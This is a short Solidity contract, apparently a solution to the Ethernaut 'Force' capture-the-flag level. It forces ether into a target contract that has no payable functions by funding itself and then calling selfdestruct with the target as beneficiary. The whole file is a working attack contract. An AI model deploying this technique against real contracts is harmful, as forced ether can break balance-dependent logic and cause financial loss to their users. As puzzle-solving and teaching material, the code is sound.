// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Force.sol";

contract ForceAttacker {
    Force force;

    constructor (address _force) public {
        force = Force(_force);
    }

    function attack() public payable {
        // cast address to payable
        address payable addr = payable(address(force));
        selfdestruct(addr);
    }
    
    fallback() external payable {
    }
        
    receive() external payable {}
}